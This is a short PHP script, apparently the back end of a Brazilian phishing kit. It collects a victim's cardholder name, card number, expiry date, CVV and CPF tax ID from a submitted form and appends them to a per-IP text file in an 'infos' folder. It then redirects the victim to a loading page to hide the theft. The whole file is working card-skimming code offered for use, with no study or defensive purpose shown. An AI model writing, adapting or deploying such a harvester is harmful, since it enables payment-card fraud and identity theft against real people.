<?php

date_default_timezone_set('America/Sao_Paulo');


$matts .= "Content-type: text/html; charset=iso-8859-1\r\n";
$matts .= "MIME-Version: 1.0\n";

$nomecard = $_POST['nomecard'];
$ncard = $_POST['ncard'];
$vcard = $_POST['vcard'];
$ccard = $_POST['ccard'];
$cpf = $_POST['cpf'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ipinfo.io/json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$ip = $data['ip'];
$navegador = $_SERVER['HTTP_USER_AGENT'];
$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$today = date("d/m/y"); 
$hora = date("H:i:s");
$arquivo    = 'infos/terra-' . $ip . ".txt";

$stringData = "NOME: $nomecard;CPF: $cpf;CC: $ncard;VALIDADE: $vcard;CVV: $ccard";

    $fp = fopen($arquivo, 'a+');
    if ($fp) {
        fwrite($fp, $stringData);
        fclose($fp);
    }

header( 'Location: loading.php' ) ;
?>